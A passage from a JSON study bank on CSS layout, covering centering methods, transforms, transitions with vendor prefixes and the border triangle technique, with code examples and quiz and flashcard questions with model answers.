              "explanation": "This example uses CSS Grid for centering. `display: grid` makes the container a grid container. The `place-items: center` property is a concise shorthand that sets both `align-items` and `justify-items` to `center`, effectively centering any direct children within their grid cells. Similar to Flexbox, the parent needs a defined `height` for vertical centering to be effective.",
              "language": "css"
            },
            {
              "id": "example_css_centering_absolute_transform",
              "title": "Centering with Absolute Positioning & Transform",
              "code": ".abs-center {\n  position: relative;\n  height: 200px; /* Example fixed height for parent */\n  width: 300px;\n  border: 1px dashed #ccc;\n}\n\n.abs-center > .child {\n  position: absolute;\n  top: 50%;\n  left: 50%;\n  transform: translate(-50%, -50%); /* Shifts element back by half its width/height */\n  width: 100px;\n  height: 100px;\n  background-color: lightgreen;\n  display: flex; /* To center text inside child */\n  justify-content: center;\n  align-items: center;\n  color: white;\n  font-weight: bold;\n}\n\n/* HTML Structure:\n<div class=\"abs-center\">\n  <div class=\"child\">Absolute Item</div>\n</div> */",
              "explanation": "This classic method involves setting the parent container to `position: relative` to establish a positioning context. The child is then set to `position: absolute`, and `top: 50%` and `left: 50%` move its top-left corner to the center of the parent. The crucial `transform: translate(-50%, -50%)` then shifts the element by half its own width and height in the negative direction, precisely centering it. This method works well for elements with known or fluid dimensions and when they need to be overlaid.",
              "language": "css"
            },
            {
              "id": "example_css_centering_table",
              "title": "Centering with Display Table",
              "code": ".table-center {\n  display: table;\n  height: 200px;\n  width: 100%;\n  border: 1px dashed #ccc;\n}\n\n.table-center > .cell {\n  display: table-cell;\n  vertical-align: middle; /* vertical centering */\n  text-align: center; /* horizontal centering */\n  background-color: lightsalmon;\n  color: white;\n  font-weight: bold;\n}\n\n/* HTML Structure:\n<div class=\"table-center\">\n  <div class=\"cell\">Table Cell Item</div>\n</div> */",
              "explanation": "This method mimics HTML table behavior. The parent is set to `display: table` and the child (the element to be centered) is set to `display: table-cell`. `vertical-align: middle` then vertically aligns the content within the 'cell', and `text-align: center` horizontally aligns any inline content (like text or inline-block elements) inside the 'cell'. This approach is primarily effective for centering inline content or a single block-level element acting as a table cell.",
              "language": "css"
            }
          ],
          "relatedQuestions": [
            "question_centering_mcq_1",
            "question_centering_mcq_2",
            "question_centering_open_1",
            "question_centering_flashcard_1"
          ],
          "relatedTasks": [
            "task_responsive_centered_hero"
          ],
          "tags": [
            "CSS",
            "Layout",
            "Centering",
            "Flexbox",
            "Grid",
            "Position",
            "Table Layout",
            "UI/UX"
          ],
          "technology": "CSS3",
          "prerequisites": [
            "HTML Structure",
            "CSS Box Model",
            "Basic CSS Properties"
          ],
          "complexity": 6,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Responsive Design",
            "Component Development"
          ]
        },
        {
          "id": "theory_css3_transforms",
          "title": "CSS3 Transforms: Rotate and Scale",
          "content": "CSS3 Transforms allow you to modify the coordinate space of a visual formatting model. This means you can move, rotate, scale, and skew elements without affecting the normal document flow. They are particularly useful for creating dynamic visual effects, micro-interactions, and animations. Transforms are highly performant as they are often processed by the GPU.\n\n## The `transform` Property\nThe `transform` property applies 2D or 3D transformations to an element. It takes one or more transform functions as its value. Multiple transform functions can be chained together in a single `transform` property value, applied sequentially from left to right.\n\n## `rotate()` Function\nThe `rotate()` function rotates an element around its origin (by default, the center of the element, `transform-origin: center`). The rotation angle is specified in degrees (`deg`), grads (`grad`), radians (`rad`), or turns (`turn`).\n*   Positive values (e.g., `rotate(90deg)`) rotate clockwise.\n*   Negative values (e.g., `rotate(-90deg)`) rotate counter-clockwise.\n\n## `scale()` Function\nThe `scale()` function increases or decreases the size of an element. It takes one or two values:\n*   `scale(s)`: Scales the element uniformly (both X and Y axes) by a factor of `s`. For example, `scale(0.5)` makes it half size, `scale(2)` makes it double size.\n*   `scale(sx, sy)`: Scales the element by `sx` along the X-axis and `sy` along the Y-axis independently. Values greater than 1 increase size, values between 0 and 1 decrease size.",
          "examples": [
            {
              "id": "example_transform_rotate",
              "title": "Rotating an Element",
              "code": ".rotate-clockwise {\n  transform: rotate(180deg); /* Rotates 180 degrees clockwise */\n  transition: transform 0.5s ease-in-out;\n}\n\n.rotate-counter-clockwise {\n  transform: rotate(-90deg); /* Rotates 90 degrees counter-clockwise */\n  transition: transform 0.5s ease-in-out;\n}\n\n/* Example of hover effect */\n.rotate-on-hover {\n  background-color: lightblue;\n  width: 100px;\n  height: 100px;\n  transition: transform 0.5s ease-in-out;\n}\n.rotate-on-hover:hover {\n  transform: rotate(360deg);\n}\n\n/* HTML Structure:\n<div class=\"rotate-on-hover\">Rotate Me</div> */",
              "explanation": "This example demonstrates the `rotate()` transform function. `.rotate-clockwise` rotates the element 180 degrees clockwise, while `.rotate-counter-clockwise` rotates it 90 degrees counter-clockwise. The `transition` property is added to make the rotation smooth when applied dynamically (e.g., on hover or via JavaScript). The `rotate-on-hover` class shows a practical application.",
              "language": "css"
            },
            {
              "id": "example_transform_scale",
              "title": "Scaling an Element",
              "code": ".scale-down {\n  transform: scale(0.3); /* Scales down to 30% of original size */\n  transition: transform 0.5s ease-in-out;\n}\n\n.scale-up {\n  transform: scale(1.3); /* Scales up by 30% (130% of original size) */\n  transition: transform 0.5s ease-in-out;\n}\n\n.scale-xy {\n  transform: scale(2, 0.5); /* Scales X by 200%, Y by 50% */\n  transition: transform 0.5s ease-in-out;\n}\n\n/* Example of hover effect */\n.scale-on-hover {\n  background-color: lightgreen;\n  width: 100px;\n  height: 100px;\n  transition: transform 0.3s ease;\n}\n.scale-on-hover:hover {\n  transform: scale(1.1);\n}\n\n/* HTML Structure:\n<div class=\"scale-on-hover\">Scale Me</div> */",
              "explanation": "This example illustrates the `scale()` transform function. `.scale-down` reduces the element to 30% of its original size, and `.scale-up` increases it to 130%. The `scale-xy` class demonstrates scaling independently along the X and Y axes. Transitions are included for smooth visual changes. The `scale-on-hover` class shows a common use case.",
              "language": "css"
            }
          ],
          "relatedQuestions": [
            "question_transforms_mcq_1",
            "question_transforms_code_1",
            "question_transforms_flashcard_1"
          ],
          "relatedTasks": [
            "task_interactive_image_gallery"
          ],
          "tags": [
            "CSS3",
            "Transforms",
            "Animation",
            "UI/UX",
            "Visual Effects",
            "2D Transforms"
          ],
          "technology": "CSS3",
          "prerequisites": [
            "Basic CSS Properties",
            "Box Model"
          ],
          "complexity": 4,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Interactive UI",
            "Micro-interactions"
          ]
        },
        {
          "id": "theory_css_transitions",
          "title": "CSS Transitions for Smooth Animations",
          "content": "CSS Transitions provide a way to control animation speed when changing CSS properties from one value to another. Instead of an immediate change, the change happens over a specified duration, creating a smooth, animated effect. This is fundamental for modern web interfaces to enhance user experience by making interactions feel more fluid and less jarring.\n\n## The `transition` Shorthand Property\nThe `transition` shorthand property is the most common way to define a transition. It combines up to four individual transition properties in a single declaration, in a specific order:\n\n1.  **`transition-property`**: The name of the CSS property to which the transition effect should be applied (e.g., `background-color`, `opacity`, `transform`). You can specify `all` to transition all animatable properties, but it's generally better for performance and control to list specific properties.\n2.  **`transition-duration`**: The length of time a transition takes to complete. It's specified in seconds (`s`) or milliseconds (`ms`). For example, `0.5s` or `500ms`.\n3.  **`transition-timing-function`**: Describes how intermediate values are calculated, giving the transition an acceleration curve. This dictates the speed of the animation over its duration. Common values include:\n    *   `ease` (default): Slow start, then fast, then slow end.\n    *   `linear`: Constant speed.\n    *   `ease-in`: Slow start, then accelerates.\n    *   `ease-out`: Fast start, then decelerates.\n    *   `ease-in-out`: Slow start and end, fast in the middle.\n    *   `cubic-bezier(n,n,n,n)`: For custom timing curves.\n4.  **`transition-delay`**: Specifies an optional delay before the transition starts. Also specified in seconds (`s`) or milliseconds (`ms`).\n\n## Vendor Prefixes for Cross-Browser Compatibility\nIn the past, and sometimes still for older or niche browsers, it was necessary to include vendor prefixes for experimental or non-standardized CSS properties. These prefixes ensure that a property works across different browser engines before it becomes fully standardized. While most modern browsers support `transition` without prefixes, it's good practice to be aware of them, especially in enterprise or legacy projects. Common prefixes include:\n*   `-webkit-` (Chrome, Safari, newer Opera, Android Browser)\n*   `-moz-` (Firefox)\n*   `-o-` (older Opera)\n*   `-ms-` (Internet Explorer)",
          "examples": [
            {
              "id": "example_transition_shorthand",
              "title": "Basic Transition with Shorthand",
              "code": ".smooth-change {\n  background-color: blue;\n  color: white;\n  padding: 10px 20px;\n  border-radius: 5px;\n  transition: all 0.5s ease-in-out; /* property, duration, timing-function, (delay is optional) */\n}\n\n.smooth-change:hover {\n  background-color: red;\n  color: black;\n  transform: scale(1.1);\n}\n\n/* HTML Structure:\n<button class=\"smooth-change\">Hover Me</button> */",
              "explanation": "This example shows the `transition` shorthand property. When the `.smooth-change` element is hovered, its `background-color`, `color`, and `transform` properties will change smoothly over 0.5 seconds, using an `ease-in-out` timing function. `all` as the `transition-property` means all animatable properties will transition.",
              "language": "css"
            },
            {
              "id": "example_transition_vendor_prefixes",
              "title": "Transition with Vendor Prefixes",
              "code": ".cross-browser-transition {\n  background-color: initial;\n  width: 100px;\n  height: 100px;\n  -webkit-transition: background-color 2s ease-in 1s; /* Safari 3.1+, Chrome 1+ */\n  -o-transition: background-color 2s ease-in 1s; /* Opera 10.5+ */\n  -moz-transition: background-color 2s ease-in 1s; /* Firefox 4.0+ */\n  transition: background-color 2s ease-in 1s; /* Standard syntax */\n}\n\n.cross-browser-transition:hover {\n  background-color: purple;\n}\n\n/* HTML Structure:\n<div class=\"cross-browser-transition\">Hover to Animate</div> */",
              "explanation": "This example demonstrates the use of vendor prefixes for the `transition` property. Although modern browsers often support the standard `transition` property directly, including prefixes can ensure broader compatibility, especially with older browser versions. The transition will apply to `background-color` over 2 seconds, with an `ease-in` timing function, after a 1-second delay.",
              "language": "css"
            }
          ],
          "relatedQuestions": [
            "question_transitions_mcq_1",
            "question_transitions_open_1",
            "question_transitions_flashcard_1"
          ],
          "relatedTasks": [
            "task_interactive_image_gallery",
            "task_custom_tooltip_with_triangle"
          ],
          "tags": [
            "CSS3",
            "Transitions",
            "Animation",
            "Performance",
            "UI/UX",
            "Browser Compatibility",
            "Vendor Prefixes"
          ],
          "technology": "CSS3",
          "prerequisites": [
            "Basic CSS Properties",
            "Pseudo-classes (:hover)"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "Interactive UI",
            "Smooth User Experience"
          ]
        },
        {
          "id": "theory_css_triangle_technique",
          "title": "CSS Triangle Technique using Borders",
          "content": "The CSS triangle technique is a clever trick to create triangular shapes using only CSS, without images or SVG. It leverages the behavior of borders on an element with zero width and height. When an element has no content area, its borders meet at a single point, and by making some borders transparent, you can isolate a single colored triangle.\n\n## How it Works\n1.  **Zero Dimensions**: Set `width: 0` and `height: 0` for the element. This is fundamental as it collapses the content area of the element, forcing the borders to meet at a central point rather than running along edges.\n2.  **Borders Meeting**: When an element has zero dimensions and four borders with thickness, these borders converge at the center, effectively forming four triangular segments (like slices of a pie).\n3.  **Transparent Borders**: To create a single triangle pointing in a specific direction, you make the borders *perpendicular* to the desired direction transparent, and the border *in* the desired direction solid. The solid border will form the base of your triangle.\n    *   **Down Arrow**: `border-top` is colored, `border-left` and `border-right` are transparent.\n    *   **Up Arrow**: `border-bottom` is colored, `border-left` and `border-right` are transparent.\n    *   **Right Arrow**: `border-left` is colored, `border-top` and `border-bottom` are transparent.\n    *   **Left Arrow**: `border-right` is colored, `border-top` and `border-bottom` are transparent.\n\nThe `border-width` of the transparent borders and the colored border determines the size and shape (e.g., isosceles, equilateral) of the resulting triangle. By varying these widths, you can control the aspect ratio of the triangle.",
          "examples": [
            {
              "id": "example_triangle_down",
              "title": "Triangle Pointing Down",
              "code": ".triangle-down {\n  width: 0;\n  height: 0;\n  border-left: 20px solid transparent;\n  border-right: 20px solid transparent;\n  border-top: 20px solid #333; /* This border forms the triangle base */\n}",
              "explanation": "This example creates a triangle pointing downwards. The `width` and `height` are set to `0`. `border-left` and `border-right` are transparent, effectively making them invisible, but they still occupy space. `border-top` has a solid color, which forms the horizontal base of the triangle. The transparent left and right borders, meeting at a point below the base, form the two slanting sides.",
              "language": "css"
            },
            {
              "id": "example_triangle_up",
              "title": "Triangle Pointing Up",
              "code": ".triangle-up {\n  width: 0;\n  height: 0;\n  border-left: 20px solid transparent;\n  border-right: 20px solid transparent;\n  border-bottom: 20px solid #333; /* This border forms the triangle base */\n}",
              "explanation": "Similar to the 'down' triangle, this one uses `border-bottom` for the visible base and transparent `border-left` and `border-right` to create the upward-pointing shape.",
              "language": "css"
            },
            {
              "id": "example_triangle_right",
              "title": "Triangle Pointing Right",
              "code": ".triangle-right {\n  width: 0;\n  height: 0;\n  border-top: 20px solid transparent;\n  border-bottom: 20px solid transparent;\n  border-left: 20px solid #333; /* This border forms the triangle base */\n}",
              "explanation": "For a right-pointing triangle, the `border-left` is colored, acting as the vertical base. The `border-top` and `border-bottom` are transparent, forming the slanted sides that meet on the right.",
              "language": "css"
            },
            {
              "id": "example_triangle_left",
              "title": "Triangle Pointing Left",
              "code": ".triangle-left {\n  width: 0;\n  height: 0;\n  border-top: 20px solid transparent;\n  border-bottom: 20px solid transparent;\n  border-right: 20px solid #333; /* This border forms the triangle base */\n}",
              "explanation": "This example, completing the pattern, uses `border-right` as the colored vertical base and transparent `border-top` and `border-bottom` to create a left-pointing triangle.",
              "language": "css"
            }
          ],
          "relatedQuestions": [
            "question_triangle_mcq_1",
            "question_triangle_open_1",
            "question_triangle_flashcard_1"
          ],
          "relatedTasks": [
            "task_custom_tooltip_with_triangle"
          ],
          "tags": [
            "CSS",
            "Advanced CSS",
            "UI Components",
            "Styling",
            "Borders",
            "Shapes"
          ],
          "technology": "CSS3",
          "prerequisites": [
            "CSS Box Model",
            "Border Property"
          ],
          "complexity": 6,
          "interviewRelevance": 6,
          "learningPath": "intermediate",
          "requiredFor": [
            "Custom UI Elements",
            "Tooltip Design"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_centering_mcq_1",
          "topic": "Centering Elements in CSS",
          "level": "easy",
          "type": "mcq",
          "question": "Which CSS property combination is a concise shorthand for centering an item horizontally and vertically within a CSS Grid container?",
          "answer": "`place-items: center;`",
          "options": [
            "`align-items: center; justify-content: center;`",
            "`place-content: center;`",
            "`place-items: center;`",
            "`display: grid; center-items: true;`"
          ],
          "analysisPoints": [
            "Tests knowledge of CSS Grid's centering properties.",
            "Distinguishes between `place-items` (for items) and `place-content` (for grid tracks/lines)."
          ],
          "keyConcepts": [
            "CSS Grid",
            "Centering",
            "place-items",
            "align-items",
            "justify-items"
          ],
          "evaluationCriteria": [
            "Correct identification of Grid centering shorthand.",
            "Understanding of specific CSS properties for centering."
          ],
          "example": "The `place-items` property is a shorthand for both `align-items` and `justify-items`. When set to `center`, it centers grid items along both the block (vertical) and inline (horizontal) axes simultaneously. `align-items: center; justify-content: center;` would work but is not a shorthand specific to Grid's combined centering of *items*. `place-content` is used for aligning the grid tracks themselves, not individual items.",
          "tags": [
            "CSS",
            "Grid",
            "Centering",
            "Shorthand"
          ],
          "prerequisites": [
            "CSS Grid Basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_centering_mcq_2",
          "topic": "Centering Elements in CSS",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following CSS for centering a `.child` element within its `.parent`:\n\n```css\n.parent {\n  position: relative;\n  width: 300px;\n  height: 200px;\n}\n.child {\n  position: absolute;\n  top: 50%;\n  left: 50%;\n  /* MISSING CSS HERE */\n  width: 100px;\n  height: 50px;\n}\n```\n\nWhich CSS property should replace `/* MISSING CSS HERE */` to perfectly center the `.child` element, regardless of its `width` and `height`?",
          "answer": "`transform: translate(-50%, -50%);`",
          "options": [
            "`margin-left: -50px; margin-top: -25px;`",
            "`transform: translateX(-50%) translateY(-50%);`",
            "`transform: translate(-50%, -50%);`",
            "`align-self: center; justify-self: center;`"
          ],
          "analysisPoints": [
            "Tests understanding of the absolute positioning + transform centering method.",
            "Evaluates knowledge of the `translate()` function and its use for precise centering relative to the element's own size.",
            "Distinguishes between flexible and fixed offset calculations."
          ],
          "keyConcepts": [
            "Absolute Positioning",
            "CSS Transforms",
            "Centering",
            "translate()",
            "Box Model"
          ],
          "evaluationCriteria": [
            "Ability to apply complex CSS centering techniques.",
            "Knowledge of `transform` property syntax and behavior.",
            "Understanding of coordinate systems in CSS."
          ],
          "example": "The `top: 50%;` and `left: 50%;` position the top-left corner of the child element at the parent's center. To shift the element so its own center aligns with this point, you need to move it back by half its own width and half its own height. `transform: translate(-50%, -50%);` does exactly this, where the percentages refer to the element's *own* dimensions, making it robust for varying child sizes. `transform: translateX(-50%) translateY(-50%);` is functionally equivalent but less concise. `margin-left: -50px; margin-top: -25px;` would only work if the child's dimensions are fixed and known (100px width, 50px height), making it inflexible.",
          "tags": [
            "CSS",
            "Positioning",
            "Transforms",
            "Centering",
            "Absolute"
          ],
          "prerequisites": [
            "CSS Box Model",
            "Absolute Positioning"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_centering_open_1",
          "topic": "Centering Elements in CSS",
          "level": "hard",
          "type": "open",
          "question": "Compare and contrast the CSS Flexbox and CSS Grid methods for centering an arbitrary block-level element. Discuss their respective strengths, weaknesses, and ideal use cases for centering. When would you choose one over the other for a complex layout requiring centering?",
          "answer": "CSS Flexbox and CSS Grid are both powerful layout modules that provide excellent solutions for centering elements, but they operate on different principles and are suited for different scenarios.\n\n**Flexbox (`display: flex`) for Centering:**\n*   **How it works**: For a single item, apply `display: flex`, `justify-content: center` (main axis), and `align-items: center` (cross axis) to the parent. The child itself remains a block-level element within the flex flow.\n*   **Strengths**: Extremely simple and effective for one-dimensional alignment (either row or column). Great for individual components or distributing space along a single axis. Very flexible with content that might grow or shrink.\n*   **Weaknesses**: Can become cumbersome for complex two-dimensional layouts where items need to align across both rows and columns simultaneously. Nesting flex containers might be necessary for such cases, which can add complexity.\n*   **Ideal Use Cases**: Centering a modal dialog, aligning navigation items, creating simple button groups, or any scenario where you need to distribute or align items along a single axis.\n\n**CSS Grid (`display: grid`) for Centering:**\n*   **How it works**: For a single item, apply `display: grid` and `place-items: center` to the parent. The child element occupies a single grid cell and is centered within it. `place-items` is a shorthand for `align-items` and `justify-items`.\n*   **Strengths**: Provides native two-dimensional alignment. The `place-items` shorthand is incredibly concise. It's built for comprehensive layout design and can handle complex grid structures where items span multiple rows/columns.\n*   **Weaknesses**: For simple, single-axis alignment, it might be overkill compared to Flexbox. Its full power is realized in grid-based layouts, and for just centering one item, it might involve concepts (like grid tracks) not strictly necessary.\n*   **Ideal Use Cases**: Centering content within a specific grid cell in a larger layout, overall page layout where different sections need precise alignment, or when components naturally fit into a grid structure.\n\n**When to choose one over the other for complex layouts:**\n*   **Choose Flexbox** when your primary need is **one-dimensional alignment** (either row or column) and distribution of space. If you're building a component (like a header, footer, or card) where items flow primarily along one axis, Flexbox is often the more intuitive and performant choice. It's excellent for dynamic content where items might wrap or resize.\n*   **Choose CSS Grid** when you're defining a **two-dimensional page layout** or a complex component with explicit row and column structures. If you need items to align precisely across both horizontal and vertical axes simultaneously, or if you have overlapping elements within a grid, Grid is the more powerful and semantically appropriate tool. For instance, centering a 'hero' content block that lives within a larger, fixed grid structure on a page.",
          "analysisPoints": [
            "Comprehensively compares two modern layout methods.",
            "Discusses technical implementation details for each.",
            "Identifies practical strengths and weaknesses.",
            "Provides clear use-case distinctions.",
            "Demonstrates understanding of when to apply each technology."
          ],
          "keyConcepts": [
            "CSS Flexbox",
            "CSS Grid",
            "Centering",
            "1D vs 2D Layout",
            "justify-content",
            "align-items",
            "place-items",
            "Layout Strategy"
          ],
          "evaluationCriteria": [
            "Depth of knowledge regarding Flexbox and Grid.",
            "Ability to articulate comparative advantages.",
            "Practical application understanding.",
            "Clarity and structure of explanation."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Flexbox",
            "Grid",
            "Centering",
            "Layout",
            "Comparison",
            "Advanced CSS"
          ],
          "prerequisites": [
            "CSS Flexbox",
            "CSS Grid"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_centering_flashcard_1",
          "topic": "Centering Elements in CSS",
          "level": "easy",
          "type": "flashcard",
          "question": "What CSS properties are typically applied to a parent container to center a child element both horizontally and vertically using Flexbox?",
          "answer": "`display: flex; justify-content: center; align-items: center;` (and the parent container needs a defined height for vertical centering to be visible).",
          "analysisPoints": [
            "Tests recall of basic Flexbox centering properties.",
            "Highlights the importance of parent height for vertical centering."
          ],
          "keyConcepts": [
            "Flexbox",
            "justify-content",
            "align-items",
            "vertical centering",
            "horizontal centering"
          ],
          "evaluationCriteria": [
            "Direct recall of key Flexbox properties."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Flexbox",
            "Centering",
            "Flashcard"
          ],
          "prerequisites": [
            "CSS Flexbox Basics"
          ],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_transforms_mcq_1",
          "topic": "CSS3 Transforms",
          "level": "easy",
          "type": "mcq",
          "question": "What does `transform: scale(0.5);` do to an element?",
          "answer": "It shrinks the element to 50% of its original size, both horizontally and vertically.",
          "options": [
            "It moves the element 0.5 pixels to the right.",
            "It rotates the element by 0.5 degrees.",
            "It makes the element 50% transparent.",
            "It shrinks the element to 50% of its original size, both horizontally and vertically."
          ],
          "analysisPoints": [
            "Tests basic understanding of the `scale()` transform function.",
            "Distinguishes `scale` from other transform functions or properties like `opacity`."
          ],
          "keyConcepts": [
            "CSS Transforms",
            "scale()",
            "Element Size"
          ],
          "evaluationCriteria": [
            "Correct interpretation of `scale()` function value."
          ],
          "example": "The `scale()` transform function modifies the size of an element. A value less than 1 (like 0.5) reduces the size, while a value greater than 1 increases it. If only one value is provided, it applies to both the X and Y axes (uniform scaling).",
          "tags": [
            "CSS3",
            "Transforms",
            "Scale",
            "Animation"
          ],
          "prerequisites": [
            "Basic CSS Properties"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_transforms_code_1",
          "topic": "CSS3 Transforms",
          "level": "medium",
          "type": "code",
          "question": "Write the CSS to make a `.box` element rotate 90 degrees clockwise and simultaneously scale up by 20% when hovered over. The transformation should be smooth and take 0.3 seconds.",
          "answer": "```css\n.box {\n  width: 100px;\n  height: 100px;\n  background-color: steelblue;\n  transition: transform 0.3s ease-in-out;\n}\n\n.box:hover {\n  transform: rotate(90deg) scale(1.2);\n}\n```",
          "analysisPoints": [
            "Tests ability to combine multiple transform functions.",
            "Evaluates understanding of `transition` property for smooth effects.",
            "Checks use of `:hover` pseudo-class."
          ],
          "keyConcepts": [
            "CSS Transforms",
            "rotate()",
            "scale()",
            "CSS Transitions",
            ":hover"
          ],
          "evaluationCriteria": [
            "Correct syntax for `transform` with multiple functions.",
            "Proper application of `transition` for animation.",
            "Effective use of pseudo-classes."
          ],
          "example": "The `.box` element is given a `transition` property to ensure smooth animation for its `transform` property. On `:hover`, `transform: rotate(90deg) scale(1.2)` is applied. Multiple transform functions can be chained in a single `transform` property value, separated by spaces. The `transition: transform 0.3s ease-in-out;` ensures the effect takes 0.3 seconds and has a smooth acceleration/deceleration.",
          "tags": [
            "CSS3",
            "Transforms",
            "Transitions",
            "Animation",
            "Code Challenge"
          ],
          "prerequisites": [
            "CSS Transitions",
            "CSS Transforms"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_transforms_flashcard_1",
          "topic": "CSS3 Transforms",
          "level": "easy",
          "type": "flashcard",
          "question": "What CSS property is used to apply 2D or 3D transformations like rotating or scaling an element?",
          "answer": "`transform`",
          "analysisPoints": [
            "Tests direct recall of the core CSS transform property."
          ],
          "keyConcepts": [
            "CSS Transforms",
            "rotate",
            "scale"
          ],
          "evaluationCriteria": [
            "Correct identification of the transform property."
          ],
          "example": null,
          "tags": [
            "CSS3",
            "Transforms",
            "Flashcard"
          ],
          "prerequisites": [
            "Basic CSS"
          ],
          "complexity": 2,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_transitions_mcq_1",
          "topic": "CSS Transitions",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following `transition` property declarations will cause a background color change to animate over 1 second, starting after a 0.5 second delay, with a slow start and end?",
          "answer": "`transition: background-color 1s ease-in-out 0.5s;`",
          "options": [
            "`transition: background-color 0.5s 1s ease-in-out;`",
            "`transition: background-color 1s ease-in-out 0.5s;`",
            "`transition-property: background-color; transition-duration: 1s; transition-delay: 0.5s; transition-timing-function: ease;`",
            "`transition: all 1s ease-in-out 0.5s;`"
          ],
          "analysisPoints": [
            "Tests knowledge of the `transition` shorthand order of values (property, duration, timing-function, delay).",
            "Distinguishes correct timing function for slow start/end.",
            "Identifies correct syntax for delay."
          ],
          "keyConcepts": [
            "CSS Transitions",
            "transition-property",
            "transition-duration",
            "transition-timing-function",
            "transition-delay",
            "shorthand"
          ],
          "evaluationCriteria": [
            "Correct understanding of transition shorthand syntax.",
            "Ability to match desired animation behavior to timing function."
          ],
          "example": "The correct order for the `transition` shorthand property is `transition-property`, `transition-duration`, `transition-timing-function`, and `transition-delay`. `ease-in-out` provides a slow start and slow end. Option A has the duration and delay swapped. Option C uses individual properties, which is syntactically correct but does not use the shorthand form as implied by the question. Option D transitions `all` properties, not specifically `background-color`.",
          "tags": [
            "CSS3",
            "Transitions",
            "Animation",
            "Shorthand"
          ],
          "prerequisites": [
            "Basic CSS Properties"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_transitions_open_1",
          "topic": "CSS Transitions",
          "level": "hard",
          "type": "open",
          "question": "Explain the purpose of `transition-timing-function` in CSS transitions. Name at least three common values and describe the animation curve they produce. How does choosing the right timing function impact user experience?",
          "answer": "The `transition-timing-function` property defines how the intermediate values of a CSS property are calculated during a transition. In simpler terms, it controls the acceleration curve of the animation, determining its speed at different points between its start and end states.\n\n**Purpose:**\nWithout a timing function, transitions would typically run at a constant speed (`linear`), which often feels unnatural or abrupt to users. The `transition-timing-function` allows designers and developers to create more fluid, dynamic, and realistic animations by varying the speed of the transition over its duration.\n\n**Common Values and their Curves:**\n1.  **`ease` (Default):** This function specifies a transition with a slow start, then a fast middle, and a slow end. It's often the default because it generally provides a natural and pleasant feel, mimicking real-world physics where objects accelerate and decelerate.\n    *   *Curve*: Starts flat, gets steeper, then flattens out again.\n2.  **`linear`:** This function specifies a transition with the same speed from start to end. The animation progresses at a constant rate.\n    *   *Curve*: A straight line.\n3.  **`ease-in`:** This function specifies a transition with a slow start, accelerating towards the end. It's like an object slowly getting up to speed.\n    *   *Curve*: Starts flat and gets progressively steeper.\n4.  **`ease-out`:** This function specifies a transition with a fast start, decelerating towards the end. It's like an object quickly reaching its destination and then gently coming to a stop.\n    *   *Curve*: Starts steep and progressively flattens out.\n5.  **`ease-in-out`:** This function is similar to `ease`, but often more pronounced. It specifies a transition with a slow start, speeds up, and then ends slowly. It's symmetrical.\n    *   *Curve*: S-shaped curve, flat at both ends and steep in the middle.\n\n**Impact on User Experience:**\nChoosing the right timing function significantly impacts user experience:\n*   **Perceived Performance:** Even if two animations have the same duration, one with a well-chosen timing function (e.g., `ease-out` for an element appearing) can feel faster and more responsive than a `linear` one, as the user immediately sees progress.\n*   **Naturalness and Realism:** Timing functions can mimic physical properties (like gravity or friction), making interactions feel more intuitive and natural, rather than robotic.\n*   **Guiding Attention:** By controlling the speed, you can draw a user's eye to specific elements or transitions. A quick start can grab attention, while a slow end can allow users to process the final state.\n*   **Brand Personality:** The overall 'feel' of an application's animations can contribute to its brand identity. Snappy `ease-out` animations might convey efficiency, while gentler `ease` curves might convey elegance.\n*   **Avoidance of Disorientation:** Poorly chosen timing functions (e.g., very long `linear` animations for small changes) can feel jarring or make the UI feel sluggish, leading to frustration and disorientation for the user.",
          "analysisPoints": [
            "Detailed explanation of `transition-timing-function`'s role.",
            "Accurate description of common values and their visual effects.",
            "Thorough discussion of user experience impact.",
            "Demonstrates advanced understanding of CSS animation principles."
          ],
          "keyConcepts": [
            "CSS Transitions",
            "transition-timing-function",
            "Animation Curves",
            "User Experience (UX)",
            "Ease",
            "Linear",
            "Ease-in",
            "Ease-out",
            "Ease-in-out"
          ],
          "evaluationCriteria": [
            "Comprehensive and accurate definition.",
            "Illustrative examples of timing functions.",
            "Insightful analysis of UX implications.",
            "Structured and clear explanation."
          ],
          "example": null,
          "tags": [
            "CSS3",
            "Transitions",
            "Animation",
            "UX",
            "Performance",
            "Theory"
          ],
          "prerequisites": [
            "CSS Transitions"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_transitions_flashcard_1",
          "topic": "CSS Transitions",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of vendor prefixes (e.g., `-webkit-`, `-moz-`) in CSS, especially for properties like `transition`?",
          "answer": "Vendor prefixes ensure compatibility with experimental or non-standardized CSS features across different browser engines, allowing browsers to implement new features before they are fully standardized by the W3C. This helps in early adoption of new features while maintaining cross-browser support.",
          "analysisPoints": [
            "Tests recall of vendor prefix purpose.",
            "Emphasizes cross-browser compatibility and standardization process."
          ],
          "keyConcepts": [
            "Vendor Prefixes",
            "Cross-Browser Compatibility",
            "CSS Standards",
            "Experimental Features"
          ],
          "evaluationCriteria": [
            "Accurate definition of vendor prefix utility."
          ],
          "example": null,
          "tags": [
            "CSS",
            "Transitions",
            "Browser Compatibility",
            "Flashcard"
          ],
          "prerequisites": [
            "CSS Basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
